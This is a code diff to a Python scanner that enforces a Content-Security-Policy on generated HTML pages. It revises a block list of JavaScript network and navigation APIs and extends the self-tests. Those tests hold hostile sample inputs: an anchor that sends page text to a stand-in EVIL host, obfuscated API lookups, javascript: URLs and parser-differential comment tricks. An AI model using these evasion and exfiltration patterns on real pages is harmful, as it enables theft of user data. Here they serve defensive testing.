@@ -44,9 +44,9 @@ ASCII_WS = re.compile(r"[\t\n\f\r ]+")
 DIRECTIVE = re.compile(r"^[A-Za-z0-9-]+$")
 BANNED_JS = re.compile(
     # network and side channels the CSP does not fully cover
-    r"\bfetch\b|XMLHttpRequest|WebSocket|EventSource|sendBeacon|serviceWorker|RTCPeerConnection|RTCDataChannel|"
-    r"\bimport\b|importScripts|\bWorker\b|SharedWorker|\bnavigator\s*\[|"
-    r"\bnavigator\s*\.\s*(?!(?:language|languages|userAgent|platform|onLine|hardwareConcurrency|maxTouchPoints)\b)|"
+    r"\bfetch\s*\(|XMLHttpRequest|WebSocket|EventSource|sendBeacon|serviceWorker|RTCPeerConnection|RTCDataChannel|"
+    r"\bimport\s*\(|importScripts|\bnew\s+(?:Shared)?Worker\b|\bWorker\s*\(|SharedWorker|\bnavigator\s*\[|"
+    r"\bnavigator\s*\.\s*(?!(?:language|languages|userAgent|platform|onLine|hardwareConcurrency|maxTouchPoints|clipboard\s*\.\s*writeText)\b)|"
     r"\bclaude\s*[.\[]|"  # the claude.ai Artifact runtime API talks to the network on the page's behalf
     # navigation: no CSP directive governs it
     r"\b(?:window|document|self|top|parent|globalThis|this)\s*\.\s*location\b|(?<![.\w$\]])location\s*[.=\[]|"
@@ -84,25 +84,30 @@ FETCH_ATTRS = {("script", "src"), ("link", "href"), ("img", "src"), ("img", "src
                ("use", "href"), ("use", "xlink:href"), ("image", "href"), ("image", "xlink:href"),
                ("feimage", "href"), ("feimage", "xlink:href"), ("a", "ping"), ("area", "ping"), ("link", "imagesrcset")}
 LINK_ATTRS = {("a", "href"), ("a", "xlink:href"), ("area", "href")}
-CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f\x85]")
+CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f]")
 # Characters Python's \s treats as whitespace but browsers do not: an attribute separator or a comment close built from
 # one of these reads as markup to the scanner and as text to the browser.
-NONASCII_WS = re.compile("[\u00a0\u1680\u180e\u2000-\u200b\u2028\u2029\u202f\u205f\u3000\ufeff]")
+NONASCII_WS = re.compile("[\u0085\u00a0\u1680\u180e\u2000-\u200b\u2028\u2029\u202f\u205f\u3000\ufeff]")
 # Constructs browsers and html.parser (3.9 through 3.14) read differently; refuse them outright.
 RAWTEXT = r"(?:script|style|textarea|title|xmp|iframe|noembed|noframes|noscript|plaintext)"
 RAW_REFUSE = [(re.compile(rf"</{RAWTEXT}(?![\t\n\f\r ]*>)", re.I), "malformed raw-text end tag (</script x>, </style x>, …)"),
-              (re.compile(r"</[\t\n\f\r ]"), "'</' followed by whitespace (a bogus comment to browsers, an end tag to some scanners)"),
+              (re.compile(r"</\s"), "'</' followed by whitespace (a bogus comment to browsers, an end tag to some scanners)"),
               (re.compile(r"<!---?>"), "abrupt comment close (<!--> or <!--->)"),
               (re.compile(r"--!>"), "comment closed with --!>"), (re.compile(r"<!\["), "CDATA or marked section"),
               (re.compile(r"<\?"), "processing instruction")]
+TAG = re.compile(r"</?[A-Za-z][^<>]*>")
+QUOTED = re.compile(r'"[^"]*"|\'[^\']*\'')
 COMMENT = re.compile(r"<!--(.*?)(?:-->|--!>)", re.S)  # the browser's comment extent
-COMMENT_EARLY_CLOSE = re.compile(r"--[\t\n\f\r ]+>")  # Python 3.9 closes a comment here; browsers do not
+COMMENT_EARLY_CLOSE = re.compile(r"--\s+>")  # Python 3.9 closes a comment here; browsers do not
 WS = r"[\t\n\f\r ]*"
 CSP_CHARS = r"[\x20\x21\x23-\x25\x27-\x3b\x3d\x3f-\x7e]*"  # printable ASCII minus " & < >
 # The document must begin with the generated head block verbatim, so that every parser sees the same CSP in <head>.
+CMT = rf"(?:<!--(?:[\t\n\f\r\x20\x22-\x2c\x2e-\x3b\x3d\x3f-\x7e\u2013\u2014\u00b7]|-(?!-))*-->{WS})*"  # plain comments: no '--', '<', '>', '!'
+VIEWPORT = r'<meta name="viewport" content="[A-Za-z0-9=,.: -]*"'
 HEAD_PREFIX = re.compile(
-    rf"^<!doctype html>{WS}(?:<html(?:[\t\n\f\r ]+(?:lang|dir|class|id)=\"[A-Za-z0-9 _-]*\")*>{WS})?<head>{WS}"
-    rf"<meta charset=\"utf-8\"{WS}/?>{WS}<meta http-equiv=\"content-security-policy\" content=\"({CSP_CHARS})\">", re.I)
+    rf"^{WS}{CMT}<!doctype html>{WS}{CMT}(?:<html(?:[\t\n\f\r ]+(?:lang|dir|class|id)=\"[A-Za-z0-9 _-]*\")*>{WS}{CMT})?<head>{WS}{CMT}"
+    rf"<meta charset=\"utf-8\"{WS}/?>{WS}{CMT}(?:{VIEWPORT}{WS}/?>{WS}{CMT})?"
+    rf"<meta http-equiv=\"content-security-policy\" content=\"({CSP_CHARS})\"{WS}/?>", re.I)
 
 
 def scheme_host(url):
@@ -198,7 +203,8 @@ class Scan(HTMLParser):
         if self.csp is None:
             if tag == "head" and self.stack not in ([], ["html"]):
                 self.other_seen = True
-            if not (tag in ("html", "head") or (tag == "meta" and set(a) <= {"charset"})) and not (
+            viewport = tag == "meta" and set(a) == {"name", "content"} and a["name"].lower() == "viewport"
+            if not (tag in ("html", "head") or viewport or (tag == "meta" and set(a) <= {"charset"})) and not (
                     tag == "meta" and a.get("http-equiv", "").strip().lower() == "content-security-policy"):
                 self.other_seen = True  # before the CSP only <html>, <head> and <meta charset> may open
             if self.stack[-1:] == ["head"]:
@@ -281,15 +287,7 @@ class Scan(HTMLParser):
         rel = set(a.get("rel", "").lower().split())
         if tag == "script" or (tag == "link" and "stylesheet" in rel):
             if tag == "link" and host == GFONTS_CSS:
-                u = urlsplit(url)
-                if u.path not in ("/css", "/css2"):
-                    self.fail(f"Google Fonts stylesheet must be /css or /css2, not {u.path}")
-                for part in u.query.split("&"):
-                    k, _, v = part.partition("=")
-                    if part and not ((k == "family" and all(GF_FAMILY.match(x) for x in v.split("|")))
-                                     or (k == "display" and v in ("auto", "block", "swap", "fallback", "optional"))):
-                        self.fail(f"Google Fonts query may only carry family= and display= ({part[:40]!r} is not a font name)")
-                self.gfonts.add(f"https://{GFONTS_CSS}{u.path}")
+                self.google_fonts(url)
                 return
             src, err = pinned_source(url)
             if err:
@@ -331,8 +329,9 @@ class Scan(HTMLParser):
     def handle_data(self, data):
         if self.csp is None and data.strip("\t\n\f\r "):  # HTML whitespace only; &nbsp; is text and starts the body
             self.other_seen = True
-        if self.in_script and (m := BANNED_JS.search(data)):
-            self.fail(f"script uses {m.group(0).strip()!r} (network, navigation, storage or obfuscation)")
+        if self.in_script:
+            for tok in script_bans(data):
+                self.fail(f"script uses {tok!r} (network, navigation, storage or obfuscation){HINTS.get(tok.split()[0].strip('.=([').lower(), '')}")
         if self.in_script and re.search(r"<!--|<script", data, re.I):
             self.fail("script text contains <!-- or <script (script-data escape states differ between parsers)")
         if self.foreign_raw and re.search(r"[<&]", data):
@@ -354,13 +353,69 @@ class Scan(HTMLParser):
     def handle_pi(self, data):
         self.fail("processing instruction is not allowed")
 
+    def google_fonts(self, url):
+        u = urlsplit(url)
+        if u.path not in ("/css", "/css2"):
+            self.fail(f"Google Fonts stylesheet must be /css or /css2, not {u.path}")
+        for part in u.query.split("&"):
+            k, _, v = part.partition("=")
+            if part and not ((k == "family" and all(GF_FAMILY.match(x) for x in v.split("|")))
+                             or (k == "display" and v in ("auto", "block", "swap", "fallback", "optional"))):
+                self.fail(f"Google Fonts query may only carry family= and display= ({part[:40]!r} is not a font name)")
+        self.gfonts.add(f"https://{GFONTS_CSS}{u.path}")
+
     def check_css(self, css):
         if "\\" in css:
             self.fail("CSS contains a backslash escape (it can spell url( past a scanner)")
         for m in CSS_URL.finditer(css):
-            kind, host = scheme_host(m.group(1) or m.group(2) or "")
-            if kind not in ("data", "frag"):
+            url = m.group(1) or m.group(2) or ""
+            kind, host = scheme_host(url)
+            if m.group(2) is not None and self.in_style and kind == "https" and host == GFONTS_CSS:
+                self.google_fonts(url)  # @import of the Google Fonts stylesheet, same rules as the <link>
+            elif kind not in ("data", "frag"):
                 self.fail("CSS may only reference data: URIs (web fonts come through the Google Fonts stylesheet, not page CSS)")
+
+
+HINTS = {
+    "location": "; rename a variable or data field called location (for example site)",
+    "click": "; for a download, create the <a> in script, give it download= and an object or data: URL, then .click() it",
+    "open": "; rename a function called open, or use a visible link with rel=\"noopener noreferrer\"",
+}
+
+
+def download_click(data, pos):
+    """True when the .click() at pos is on a script-created <a download> whose href is only an object URL or data: URL."""
+    m = re.search(r"([A-Za-z_$][\w$]*)\s*$", data[:pos])
+    if not m or not re.match(r"\.click\s*\(\s*\)", data[pos:]):
+        return False
+    n = re.escape(m.group(1))
+    assigned = lambda v: len(re.findall(rf"(?<![\w$.]){v}\s*=(?![=>])", data))
+    if assigned(n) != 1 or not re.search(rf"\b(?:const|let|var)\s+{n}\s*=\s*document\s*\.\s*createElement\s*\(\s*['\"`]a['\"`]\s*\)", data):
+        return False
+    if not re.search(rf"(?<![\w$]){n}\s*\.\s*download\s*=|(?<![\w$]){n}\s*\.\s*setAttribute\s*\(\s*['\"`]download", data):
+        return False
+    if re.search(rf"(?<![\w$]){n}\s*\[|assign\s*\(\s*{n}\b|(?<![\w$]){n}\s*\.\s*(?:ping|target|outerHTML|innerHTML)", data):
+        return False
+    hrefs = re.findall(rf"(?<![\w$]){n}\s*\.\s*href\s*=(?!=)\s*([^;\n]+)", data)
+    for h in (x.strip() for x in hrefs):
+        if h.startswith("URL.createObjectURL(") or re.match(r"['\"`]data:", h):
+            continue
+        v = re.fullmatch(r"[A-Za-z_$][\w$]*", h)
+        if v and assigned(re.escape(h)) == 1 and re.search(rf"\b(?:const|let|var)\s+{re.escape(h)}\s*=\s*URL\s*\.\s*createObjectURL\s*\(", data):
+            continue
+        return False
+    return bool(hrefs)
+
+
+def script_bans(data):
+    """Every distinct banned construct in a script, so one retry can fix them all."""
+    data = data.replace("\ufeff", " ")  # JavaScript whitespace that Python's \s does not match
+    hits = []
+    for m in BANNED_JS.finditer(data):
+        if m.group(0) == ".click" and download_click(data, m.start()):
+            continue
+        hits.append(m.group(0).strip())
+    return list(dict.fromkeys(hits))
 
 
 def csp_directives(csp):
@@ -396,7 +451,8 @@ def csp_text(scripts=(), styles=(), gfonts=()):
 
 
 def head_block(scripts=(), styles=(), gfonts=()):
-    return ('<meta charset="utf-8">\n<meta http-equiv="Content-Security-Policy" content="'
+    return ('<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1">\n'
+            '<meta http-equiv="Content-Security-Policy" content="'
             + csp_text(scripts, styles, gfonts) + '">\n<meta name="referrer" content="no-referrer">')
 
 
@@ -423,9 +479,10 @@ def check_html(text):
     bad = []
     if CONTROL.search(text):
         return ["control characters in the document (legacy-encoding escapes re-tokenise the markup)"]
-    if (m := NONASCII_WS.search(text)):
-        return [f"non-ASCII whitespace U+{ord(m.group(0)):04X} at offset {m.start()} (browsers do not treat it as a space; "
-                "scanners may); write &nbsp; or a plain space"]
+    for t in TAG.finditer(text):
+        if (m := NONASCII_WS.search(QUOTED.sub("", t.group(0)))):
+            return [f"non-ASCII whitespace U+{ord(m.group(0)):04X} inside the tag at offset {t.start()} (browsers do not treat it "
+                    "as an attribute separator; scanners may); use a plain space there"]
     for rx, why in RAW_REFUSE:
         if rx.search(text):
             bad.append(why)
@@ -438,6 +495,8 @@ def check_html(text):
     s.close()
     bad += s.bad
     seq = [(t, a) for t, a in s.head_seq]
+    if len(seq) >= 3 and seq[1][0] == "meta" and seq[1][1].get("name", "").lower() == "viewport":
+        seq = seq[:1] + seq[2:]
     ok_head = (len(seq) >= 2 and seq[0][0] == "meta" and set(seq[0][1]) == {"charset"} and seq[0][1]["charset"].lower() == "utf-8"
                and seq[1][0] == "meta" and seq[1][1].get("http-equiv", "").lower() == "content-security-policy")
     if not prefix or (s.csp is not None and (not ok_head or s.other_seen)):
@@ -701,8 +760,26 @@ def selftest():
         doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700|Open+Sans">', gfonts=[f"https://{GFONTS_CSS}/css"]),
         "﻿" + doc(),  # BOM is stripped by read_html; check_html itself must also tolerate the plain doc
     ]
+    dl = ('<script>document.getElementById("b").addEventListener("click",()=>{const blob=new Blob(["a,b"],{type:"text/csv"});'
+          'const url=URL.createObjectURL(blob);const a=document.createElement("a");a.href=url;a.download="r.csv";'
+          'document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(url)})</script>')
+    good += [
+        doc(f'<button id=b>Export</button>{dl}'),  # the standard CSV export
+        doc('<script>const link=document.createElement("a");link.setAttribute("download","r.csv");'
+            'link.href="data:text/csv;charset=utf-8,"+encodeURIComponent("a,b");link.click()</script>'),
+        doc('<script>const rows=[{worker:"J. Doe",location:{name:"North Barn"}}];// nothing is fetched; Worker column shown'
+            '\nconst n=rows[0].location.name;navigator.clipboard.writeText(n)</script>'),
+        doc('<p>Smith\u00a0Ranch\u200b</p><script>const c="Fresno\u00a0CA"</script><td title="a\u00a0b">x</td>'),
+        doc(head_extra='<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>'
+            '<style>@import url("https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap");body{font-family:Montserrat}</style>',
+            gfonts=[f"https://{GFONTS_CSS}/css2"]),
+        "\n<!-- AIPM-CONFIDENTIAL-INTERNAL -->\n" + doc(pre="<!-- CONFIDENTIAL – FOR INTERNAL USE ONLY -->"),
+        doc(charset='<meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0">'),
+        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}" />'),
+        head_block().join(['<!DOCTYPE html>\n<html lang="en">\n<head>\n', '\n<title>t</title></head><body><p>x</p></body></html>']),
+    ]
     for g in good:
-        assert check_html(g.lstrip("﻿")) == [], check_html(g.lstrip("﻿"))
+        assert check_html(g.lstrip("﻿")) == [], (g[:300], check_html(g.lstrip("﻿")))
     assert check_html(doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text().replace("https://", "HTTPS://")}">')) == []
     bad = {  # (document, substring expected in a violation)
         # the three Critical CSP-disabling tricks
@@ -730,7 +807,7 @@ def selftest():
         doc(f"<script>var a=1</script x><img src='{EVIL}/h.png'><script>1</script>"): "malformed raw-text",
         doc("<script>eval('1')</script>"): "eval",
         doc("<script>const k='fe'+'tch'</script>"): "'+'",
-        doc("<script>navigator.clipboard.writeText(1)</script>"): "navigator",
+        doc("<script>navigator.geolocation.getCurrentPosition(f)</script>"): "navigator",
         # fetch-type references the checker must still name
         doc(f'<img srcset="{PNG} 1x, {EVIL}/2x.png 2x">'): "inline data",
         doc(f'<img srcset="{PNG} 1x,{EVIL}/2x.png 2x">'): "inline data",
@@ -785,14 +862,15 @@ def selftest():
         doc(csp=f'<meta http-equiv=" Content-Security-Policy" content="{csp_text()}">'): "must start with",
         doc(csp=f'<meta http-equiv="Content-Security-Policy" content=="{csp_text()}">'): "must start with",
         doc(csp=f'<meta http-equiv="Content-Security-Policy"\u00a0content="{csp_text()}">'): "non-ASCII whitespace U+00A0",
-        doc(csp=f'<meta http-equiv="Content-Security-Policy"\u0085content="{csp_text()}">'): "control characters",
+        doc(csp=f'<meta http-equiv="Content-Security-Policy"\u0085content="{csp_text()}">'): "non-ASCII whitespace U+0085",
         doc(csp='<meta http-equiv="Content-Security-Policy" content="' + csp_text().replace("; ", ";" + chr(12)) + '">'): "must start with",
-        doc(pre="<!-- x -->"): "must start with",
+        doc(pre="<!-- x -- y -->"): "must start with",
+        doc(pre="<!-- <x> -->"): "must start with",
         doc(pre=f"<!-- -- ><meta http-equiv=\"Content-Security-Policy\" content=\"{csp_text()}\"> -->", csp=""): "-- >",
         doc("<!--><p>-->"): "abrupt comment close",
         doc("<!--->"): "abrupt comment close",
         doc("<!---->"): "",  # an empty comment is fine
-        doc(charset='<meta charset="\u00a0utf-8">'): "non-ASCII whitespace",
+        doc(charset='<meta charset="\u00a0utf-8">'): "must start with",
         # raw-text element boundaries
         doc("<script><!--<script>//</script>\nlocalStorage.setItem('n6','v')</script>"): "script text contains",
         doc("<script>/*</ script>*/ localStorage.setItem('x','1')</script>"): "'</' followed by whitespace",
@@ -817,6 +895,15 @@ def selftest():
         doc("<script>document.scripts[0].src='https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js?d=1'</script>"): ".src=",
         doc("<script>el.setAttribute('href','x')</script>"): "setAttribute('href",
         doc("<script>const p=new (this[atob('UlRDUGVlckNvbm5lY3Rpb24=')])()</script>"): "this[",
+        # the download allowance is narrow: external href, reassigned anchor, static link, no download attribute
+        doc(f'<script>const a=document.createElement("a");a.href="{EVIL}/?d="+document.body.innerText;a.download="x";a.click()</script>'): ".click",
+        doc('<script>let a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b);a=document.links[0];a.click()</script>'): ".click",
+        doc(f'<a id=x href="{EVIL}" rel="noopener noreferrer">x</a><script>const a=document.getElementById("x");a.download="y";a.click()</script>'): ".click",
+        doc('<script>const a=document.createElement("a");a.href=URL.createObjectURL(b);a.click()</script>'): ".click",
+        doc('<script>const u=location.href;const a=document.createElement("a");a.href=u;a.download="x";a.click()</script>'): ".click",
+        doc("<p>x</p>").replace("<p>x</p>", "<p\u00a0title=x>x</p>"): "inside the tag",
+        doc("<style>@import url(https://fonts.googleapis.com/css2?family=Roboto&text=secret)</style>", gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
+        doc("<script>fetch ('x'); new Worker('w.js'); import('x')</script>"): "Worker",
         doc("<a href=\"java&#9;script:localStorage.setItem('rj','v')\">x</a>"): "javascript: URL",
         doc('<svg><a href="#x"><rect width="1" height="1"/><set attributeName="href" to="javascript:1"/></a></svg>'): "attributeName=href",
         # URL and CSS tokenising differentials
@@ -825,7 +912,7 @@ def selftest():
         doc(f'<style>@font-face{{font-family:z;src:url(https://fonts.gstatic.com/s/x.woff2)}}</style>'): "data: URIs",
         doc(head_extra=f'<link rel="preload" as="image" imagesrcset="{EVIL}/p.png 1x">'): "not allowed",
         doc(f'<img srcset="data:,x, {EVIL}/l.png 2x">'): "inline data",
-        doc(f'<a href="{EVIL}" rel="noopener\u00a0noreferrer">x</a>'): "non-ASCII whitespace",
+        doc(f'<a href="{EVIL}" rel="noopener\u00a0noreferrer">x</a>'): 'rel="noopener noreferrer"',
         # Google Fonts query and font-file path
         doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&text=secret4111">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
         doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=secret%204111%20customer">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
